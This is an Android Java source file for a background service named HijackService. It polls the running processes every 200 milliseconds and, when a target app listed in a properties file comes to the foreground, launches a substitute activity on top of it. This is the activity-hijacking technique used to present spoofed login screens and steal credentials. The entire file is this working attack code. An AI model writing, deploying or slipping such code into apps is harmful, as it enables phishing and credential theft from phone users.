package com.charles.hijack;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.Properties;

public class HijackService extends Service {
    private Properties mHijackProperties;
    private Handler mH = new Handler();
    private Runnable mRunnable = new Runnable() {

        @Override
        public void run() {
            ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> appProcessInfos = activityManager
                    .getRunningAppProcesses();
            for (ActivityManager.RunningAppProcessInfo appProcessInfo : appProcessInfos) {
                if (appProcessInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                    if (mHijackProperties.containsKey(appProcessInfo.processName)) {
                        hijack(appProcessInfo.processName);
                    }
                }
            }
            mH.postDelayed(mRunnable, 200);
        }

        private void hijack(String processName) {
            try {
                Intent intent = new Intent(getBaseContext(),
                        Class.forName(mHijackProperties.getProperty(processName)));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                getApplication().startActivity(intent);
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }
    };

    public static Properties loadProperties(Context context) {
        Properties properties = new Properties();
        try {
            InputStream in = context.getAssets().open("hijack.properties");
            properties.load(in);
            in.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return properties;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (mHijackProperties == null) {
            mHijackProperties = loadProperties(this);
            mH.post(mRunnable);
        }
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}